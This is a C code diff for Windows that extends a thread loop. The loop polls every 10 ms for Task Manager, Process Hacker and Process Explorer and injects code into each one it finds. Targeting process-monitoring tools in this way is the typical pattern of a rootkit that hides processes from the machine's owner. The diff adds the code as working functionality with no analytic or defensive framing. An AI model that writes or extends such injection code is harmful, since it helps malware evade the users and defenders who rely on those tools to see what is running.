@@ -115,24 +115,51 @@ DWORD GetProcessIdFormProcessName(LPCWSTR processName)
 /********************************************************************************************************************************/
 DWORD WINAPI ThreadInjector()
 {
-    DWORD processId = 0;
-    BOOL running = FALSE;
+    DWORD taskmgrProcessId = 0;
+    BOOL taskmgrRunning = FALSE;
+
+    DWORD processhackerProcessId = 0;
+    BOOL processhackerRunning = FALSE;
+
+    DWORD processExplorer64ProcessId = 0;
+    BOOL processExplorer64Running = FALSE;
 
     while (TRUE)
     {
-        if ((processId = GetProcessIdFormProcessName(L"Taskmgr.exe")) != -1)
+        if ((taskmgrProcessId = GetProcessIdFormProcessName(L"Taskmgr.exe")) != -1)
         {
-            if (running == FALSE)
+            if (taskmgrRunning == FALSE)
             {
-                if (inject(processId))
-                    running = TRUE;
+                if (inject(taskmgrProcessId))
+                    taskmgrRunning = TRUE;
             }
         }
         else
+            taskmgrRunning = FALSE;
+        /******************************************************/
+        if ((processhackerProcessId = GetProcessIdFormProcessName(L"ProcessHacker.exe")) != -1)
         {
-            running = FALSE;
+            if (processhackerRunning == FALSE)
+            {
+                if (inject(processhackerProcessId))
+                    processhackerRunning = TRUE;
+            }
         }
-        Sleep(50);
+        else
+            processhackerRunning = FALSE;
+        /******************************************************/
+        if ((processExplorer64ProcessId = GetProcessIdFormProcessName(L"procexp64.exe")) != -1)
+        {
+            if (processExplorer64Running == FALSE)
+            {
+                if (inject(processExplorer64ProcessId))
+                    processExplorer64Running = TRUE;
+            }
+        }
+        else
+            processExplorer64Running = FALSE;
+
+        Sleep(10);
     }
 
     ExitThread(0);
